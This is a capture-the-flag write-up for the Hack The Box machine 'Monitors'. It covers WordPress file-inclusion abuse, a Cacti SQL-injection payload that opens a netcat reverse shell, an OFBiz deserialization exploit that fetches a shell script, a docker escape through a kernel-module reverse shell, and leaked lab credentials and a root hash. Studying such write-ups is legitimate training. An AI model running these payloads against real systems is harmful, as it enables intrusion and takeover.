I"∂U<h1 id="main-points">Main points</h1>
<ul>
  <li>wpscan to scan for wordpress vulnerabilities</li>
  <li>LFI to RCE <a href="/assets/%23%5Ec022f4%7Cproc/self/fd/%7Bnumber%7D">{number}</a></li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>apache2 available site default [#^2e667f</td>
          <td>conf path](/assets/%23%5E2e667f%7C%20conf%20path)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>Cacti [#^150e6a</td>
          <td>SQLi](/assets/%23%5E150e6a%7CSQLi)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>grep on user and on processes <code class="language-plaintext highlighter-rouge">ps -aux</code> <code class="language-plaintext highlighter-rouge">netstat -antup</code></li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>docker escape [#^3839ca</td>
          <td>sys_module capability](/assets/%23%5E3839ca%7Csys_module%20capability)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h1 id="enumeration">Enumeration</h1>
<p>We start with nmap enumeration</p>
<ul>
  <li>22/tcp    open     ssh            syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
  <li>80/tcp    open     http           syn-ack     Apache httpd 2.4.29 ((Ubuntu))</li>
</ul>

<p>We check port 80
<img src="/assets/Pasted%20image%2020210714031300.png" alt="Pasted image 20210714031300.png" />
We need to add monitors.htb to our /etc/hosts file.</p>

<p>==Pro tip== : <strong>the web server can see if you access with hostname or IP adress because your browser sends a header Host that contains what is typed in your URL bar. So hostname or IP adress :)</strong></p>

<p>Now it works</p>

<p><img src="/assets/Pasted%20image%2020210714031612.png" alt="Pasted image 20210714031612.png" /></p>

<p>We see this webpage is powered with Wordpress
 <img src="/assets/Pasted%20image%2020210714031839.png" alt="Pasted image 20210714031839.png" /></p>

<p>We scan with <code class="language-plaintext highlighter-rouge">wpscan</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://monitors.htb <span class="nt">-e</span> ap,t,u
</code></pre></div></div>
<ol>
  <li><strong>-e</strong>: enumerate
    <ul>
      <li><strong>ap</strong>: All plugins</li>
      <li><strong>t</strong>: themes</li>
      <li><strong>u</strong>: user</li>
    </ul>
  </li>
</ol>

<p>We see there is a plugin used:
<img src="/assets/Pasted%20image%2020210714191859.png" alt="Pasted image 20210714191859.png" /></p>

<p>Let‚Äôs see if there is an exploit in exploitDB.
We find this exploit of <a href="https://www.exploit-db.com/exploits/44544">Remote File Inclusion</a>
We can trigger it with</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="o">://</span><span class="n">monitors</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">spritz</span><span class="o">/</span><span class="n">wp</span><span class="mf">.</span><span class="n">spritz</span><span class="mf">.</span><span class="n">content</span><span class="mf">.</span><span class="n">filter</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">url</span><span class="o">=&lt;</span><span class="no">URL</span><span class="o">&gt;</span>
</code></pre></div></div>
<p>Let‚Äôs read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>
<img src="/assets/Pasted%20image%2020210714195148.png" alt="Pasted image 20210714195148.png" /></p>

<p>So there is a user Marcus</p>

<p>Now let‚Äôs read the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file to get some secrets</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php
</code></pre></div></div>

<p>We see this
<img src="/assets/Pasted%20image%2020210714195535.png" alt="Pasted image 20210714195535.png" />
Let‚Äôs check the source code:
<img src="/assets/Pasted%20image%2020210714200023.png" alt="Pasted image 20210714200023.png" />
Bingo !</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>
<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'wpadmin'</span> <span class="p">);</span>
<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'BestAdministrator@2020!'</span> <span class="p">);</span>
<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>

<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8mb4'</span> <span class="p">);</span>

<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>

<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_KEY'</span><span class="p">,</span>         <span class="s1">'KkY%W@&gt;T}4CKTw5{.n_j3bywoB0k^|OKX0{}5|UqZ2!VH!^uWKJ.O oROc,h pp:'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_KEY'</span><span class="p">,</span>  <span class="s1">'*MHA-~&lt;-,*^$raDR&amp;uxP)k(~`k/{PRT(6JliOO9XnYYbFU?Xmb#9USEjmgeHYYpm'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_KEY'</span><span class="p">,</span>    <span class="s1">')F6L,A23Tbr9yhrhbgjDHJPJe?sCsDzDow-$E?zYCZ3*f40LSCIb] E%zrW@bs3/'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_KEY'</span><span class="p">,</span>        <span class="s1">'g?vl(p${jG`JvDxVw-]#oUyd+uvFRO1tAUZQG_sGg&amp;Q7O-*tF[KIe$weE^$bB3%C'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_SALT'</span><span class="p">,</span>        <span class="s1">'8&gt;PIil3 7re_:3&amp;@^8Zh|p^I8rwT}WpVr5|t^ih05A:]xjTA,UVXa8ny:b--/[Jk'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_SALT'</span><span class="p">,</span> <span class="s1">'dN c^]m:4O|GyOK50hQ1tumg4&lt;JYlD2-,r,oq7GDjq4M Ri:x]Bod5L.S&amp;.hEGfv'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_SALT'</span><span class="p">,</span>   <span class="s1">'tCWVbTcE*_T_}X3#t+:)&gt;N+D%?vVAIw#!*&amp;OK78M[@ YT0q):G~A:hTv`bO&lt;,|68'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_SALT'</span><span class="p">,</span>       <span class="s1">'sa&gt;i39)9&lt;vVyhE3auBVzl%=p23NJbl&amp;)*.{`&lt;*&gt;;R2=QHqj_a.%({D4yI-sy]D8,'</span> <span class="p">);</span>
<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'WP_DEBUG'</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">defined</span><span class="p">(</span> <span class="s1">'ABSPATH'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
	<span class="nb">define</span><span class="p">(</span> <span class="s1">'ABSPATH'</span><span class="p">,</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="p">);</span>
<span class="p">}</span>
<span class="k">require_once</span> <span class="no">ABSPATH</span> <span class="mf">.</span> <span class="s1">'wp-settings.php'</span><span class="p">;</span>
</code></pre></div></div>
<p>But the creds dont work in ssh, we need further enumeration.</p>

<p>Let‚Äôs try to go from LFI to RCE.</p>

<p>We find this article https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899 ^c022f4</p>

<p>So we know that <code class="language-plaintext highlighter-rouge">‚Äú/proc/self/fd‚Äù</code> provides symbolic shortcut to access-logs and various other system related file.</p>

<p>So we use burp Intruder to bruteforce the id‚Äôs</p>

<p><img src="/assets/Pasted%20image%2020210717000745.png" alt="Pasted image 20210717000745.png" /></p>

<p>We see that the maximum length is the payload <code class="language-plaintext highlighter-rouge">10</code>
We see there is a call to <code class="language-plaintext highlighter-rouge">cacti</code>
let‚Äôs check
<code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/000-default.conf</code> ^2e667f</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf &lt;VirtualHost *:80&gt; # The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com
	ServerAdmin admin@monitors.htb
	DocumentRoot /var/www/html
	Redirect 403 /
	ErrorDocument 403 "Sorry, direct IP access is not allowed. &lt;br&gt;&lt;br&gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb"
	UseCanonicalName Off
	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf &lt;/VirtualHost&gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre></div></div>
<p>Let‚Äôs add <code class="language-plaintext highlighter-rouge">cacti-admin.monitors.htb</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<p>We connect and see there is a login page
<img src="/assets/Pasted%20image%2020210717003613.png" alt="Pasted image 20210717003613.png" /></p>

<p>Let‚Äôs try the creds of the admin
<code class="language-plaintext highlighter-rouge">admin: BestAdministrator@2020!</code></p>

<p>We see there is Cacti version <code class="language-plaintext highlighter-rouge">Version 1.2.12</code></p>

<p>We find in exploitDB a <a href="https://www.exploit-db.com/exploits/49810">SQLi for version 1.2.12</a>  where there is SQL injection issue in color.php in Cacti 1.2.12 that allows an admin to inject SQL via the filter parameter. This can lead to remote command execution because the product accepts stacked queries. ^150e6a</p>

<p>let‚Äôs setup netcat listener and here is our payload and URL exploit to trigger SQLi and RCE to get a shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action<span class="o">=</span><span class="nb">export</span>&amp;header<span class="o">=</span><span class="nb">false</span>&amp;filter<span class="o">=</span>1%27<span class="o">)</span>+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth<span class="p">;</span>update+settings+set+value<span class="o">=</span>%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.10.103+4444+%3E/tmp/f<span class="p">;</span>%27+where+name<span class="o">=</span>%27path_php_binary%27<span class="p">;</span><span class="nt">--</span>+-
</code></pre></div></div>
<p>And then (ignore the download), requets again this URL</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/host.php?action<span class="o">=</span>reindex
</code></pre></div></div>

<p>If it doesn‚Äôt work you can just execute the python script of the exploit in exploitDB</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script.py <span class="nt">-t</span> http://cacti-admin .monitors.htb <span class="nt">-u</span> admin <span class="nt">-p</span> BestAdministrator@2020! <span class="nt">--lhost</span> &lt;IP&gt; <span class="nt">--lport</span> 4444
</code></pre></div></div>

<p>We grep on ‚Äúmarcus‚Äù to see if there is any service related to him.
<code class="language-plaintext highlighter-rouge">grep "marcus" /etc -R 2 &gt;/dev/null</code></p>
<ul>
  <li><strong>-R</strong>: recursive</li>
  <li>/etc : for config and static files</li>
</ul>

<p><img src="/assets/Pasted%20image%2020210717014035.png" alt="Pasted image 20210717014035.png" /></p>

<p>We see there is a backup.sh service
<code class="language-plaintext highlighter-rouge">/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh</code>
that executes a script from the /home/marcus directory</p>

<p>We <code class="language-plaintext highlighter-rouge">cat</code> that file and find</p>

<p><img src="/assets/Pasted%20image%2020210717014424.png" alt="Pasted image 20210717014424.png" /></p>

<p>so the config_pass is the user marcus‚Äô password</p>

<p>Let‚Äôs ssh into marcus with password <code class="language-plaintext highlighter-rouge">VerticalEdge2020</code></p>

<p><img src="/assets/Pasted%20image%2020210717014620.png" alt="Pasted image 20210717014620.png" /></p>

<p>It worked, we have user flag now</p>

<h1 id="priv-esc">Priv Esc</h1>
<p>Let‚Äôs get privilege escalation to get root</p>

<p>We see there is a file <code class="language-plaintext highlighter-rouge">note.txt</code>
<img src="/assets/Pasted%20image%2020210717014732.png" alt="Pasted image 20210717014732.png" /></p>

<p>So probably there is a docker image that is not for production, which means it probably runs root and likely to be vulnerable to docker escape.</p>

<p>When enumerating with <code class="language-plaintext highlighter-rouge">netstat -antup</code> to see if there are services listening. We see there is a service listening at localhost:8443, port 8443 is an alternative HTTPS port
since we are not localhost, let‚Äôs make a ssh tunnel from 8443:localhost:8443
<code class="language-plaintext highlighter-rouge">ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb</code>
And let‚Äôs go to <code class="language-plaintext highlighter-rouge">localhost:8443</code>
https://localhost:8443/</p>

<p><img src="/assets/Pasted%20image%2020210717125221.png" alt="Pasted image 20210717125221.png" /></p>

<p>Let‚Äôs enumerate with gobuster
<code class="language-plaintext highlighter-rouge">gobuster dir -u https://localhost:8443/ -w /usr/share/wordlists/dirb/common.txt -k -r</code></p>

<p>We find these directories</p>

<p><img src="/assets/Pasted%20image%2020210717182254.png" alt="Pasted image 20210717182254.png" /></p>

<p>They all redirect to a login page</p>

<p><img src="/assets/Pasted%20image%2020210717182316.png" alt="Pasted image 20210717182316.png" /></p>

<p>Let‚Äôs see if there is a vulnerability in Apache OFBiz.</p>

<p>We find a RCE caused by Java deserialization of untrusted data</p>
<blockquote>
  <p>The unsafe deserialization could be exploited to execute code remotely, essentially allowing an unauthenticated attacker to successfully take over Apache OFBiz.</p>
</blockquote>

<p>We find a metasploit module for it. But I don‚Äôt want to use metasploit, so I tried another way, and I found this PoC of the <a href="https://github.com/g33xter/CVE-2020-9496">CVE-2020-9496</a>.</p>
<blockquote>
  <p>This vulnerability exists due to Java serialization issues when processing requests sent to /webtools/control/xmlrpc. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.</p>
</blockquote>

<p>Follow the steps of the PoC.</p>

<p>For Step 4, make sure to put http in the URL of your machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget http://{YOUR_IP}/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
</code></pre></div></div>

<p>For Step6, here is the command, replace the {BASE64_OUTPUT} with the output you got from the previous step</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://127.0.0.1:8443/webtools/control/xmlrpc <span class="nt">-X</span> POST <span class="nt">-v</span> <span class="nt">-d</span> <span class="s1">'&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions"&gt;{BASE64_OUTPUT}&lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span> <span class="nt">-k</span>  <span class="nt">-H</span> <span class="s1">'Content-Type:application/xml'</span>
</code></pre></div></div>

<p>After executing the PoC, we have a root shell
<img src="/assets/Pasted%20image%2020210717185538.png" alt="Pasted image 20210717185538.png" /></p>

<p>If you notice the host, you will see it‚Äôs not <code class="language-plaintext highlighter-rouge">monitors.htb</code> because we are in a docker container.</p>

<p>Let‚Äôs download LinPeas and see if we can get an escape to root of system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://YOUR_IP/linpeas.sh
</code></pre></div></div>
<p><img src="/assets/Pasted%20image%2020210717185935.png" alt="Pasted image 20210717185935.png" /></p>

<p>We see there is a sys_module capability that we can exploit to breakout of docker
<img src="/assets/Pasted%20image%2020210717190351.png" alt="Pasted image 20210717190351.png" />
https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd ^3839ca</p>

<p>Let‚Äôs follow this blog, we start by showing our capabilities with <code class="language-plaintext highlighter-rouge">capsh --print</code></p>

<p><img src="/assets/Pasted%20image%2020210717190554.png" alt="Pasted image 20210717190554.png" /></p>

<p>The container has SYS_MODULE capability. So we can insert/remove kernel modules in/from the kernel of the Docker host machine.</p>

<p>Now we need to find the IP of our docker container, we can find that with <code class="language-plaintext highlighter-rouge">ifconfig</code> from marcus ssh session
<img src="/assets/Pasted%20image%2020210717190702.png" alt="Pasted image 20210717190702.png" /></p>

<p>Then we compile a file to invoke a reverse shell with the help of usermode Helper API.
<img src="/assets/reverse-shell.c" alt="reverse-shell.c#^dcedab" />
Then we create a Makefile
<img src="/assets/reverse-shell.c" alt="reverse-shell.c#^e35de3" /></p>

<p>And we send them to the docker container with wget
<img src="/assets/Pasted%20image%2020210717191953.png" alt="Pasted image 20210717191953.png" /></p>

<p><img src="/assets/Pasted%20image%2020210717192002.png" alt="Pasted image 20210717192002.png" /></p>

<p>Let‚Äôs compile with <code class="language-plaintext highlighter-rouge">Make</code></p>

<p><img src="/assets/Pasted%20image%2020210717192351.png" alt="Pasted image 20210717192351.png" /></p>

<p>Now in marcus ssh shell, start a netcat listener.
<img src="/assets/Pasted%20image%2020210717192547.png" alt="Pasted image 20210717192547.png" /></p>

<p>Now we insert our compiled kernel module with <code class="language-plaintext highlighter-rouge">insmod</code></p>

<p><code class="language-plaintext highlighter-rouge">insmod reverse-shell.ko</code></p>

<p>And we have root in marcus
<img src="/assets/Pasted%20image%2020210717193039.png" alt="Pasted image 20210717193039.png" /></p>

<h1 id="root-hash">root hash</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$6$vSJnzptH$pCoAuyngEc2pUm3Hos6qTNzopXdvnXACaAZEDAQU4VoBc19qxa9eASxv/EKnkTEOWWGyuPobtS/QA2kAFkrWP0
</code></pre></div></div>
:ET